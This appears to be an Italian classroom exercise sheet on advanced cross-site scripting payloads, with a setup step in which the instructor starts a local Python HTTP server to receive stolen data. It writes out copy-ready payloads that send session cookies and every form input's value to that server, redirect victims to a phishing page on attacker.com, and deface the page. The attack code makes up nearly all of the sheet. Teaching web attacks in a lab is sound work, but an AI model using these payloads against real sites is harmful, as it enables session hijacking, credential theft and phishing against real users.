🎭 Esercizio 3: Payload XSS Avanzati

Da alert() a data exfiltration
🖥️ Setup: Server di Raccolta (Docente)
Prima dell'attacco, avvia un server HTTP per ricevere i dati esfiltrati:
python3 -m http.server 4444
Questo server ascolterà su http://127.0.0.1:4444 e mostrerà ogni richiesta ricevuta nel terminale.
🍪 Furto di Cookie
Ruba i cookie di sessione della vittima:
<img src=x onerror=" var img = new Image(); img.src = 'http://127.0.0.1:4444/steal?cookie=' + document.cookie; ">

Nel terminale vedrai:
GET /steal?cookie=PHPSESSID=abc123...
⌨️ Form Logger
Cattura tutti i dati inseriti nei form:
<img src=x onerror=" document.querySelectorAll('input, textarea') .forEach(function(el){ el.addEventListener('change', function(){ fetch('http://127.0.0.1:4444/?field=' + encodeURIComponent(el.name) + '&value=' + encodeURIComponent(el.value) ); }); }); ">
🔀 Redirect Malevolo
Reindirizza la vittima a un sito di phishing:
<img src=x onerror=" window.location='http://attacker.com/fake-login' ">
💥 Modifica DOM
Defacement della pagina con jQuery:
<img src=x onerror=" $('body').html('<h1>HACKED!</h1>'); $('body').css('background', 'red'); ">
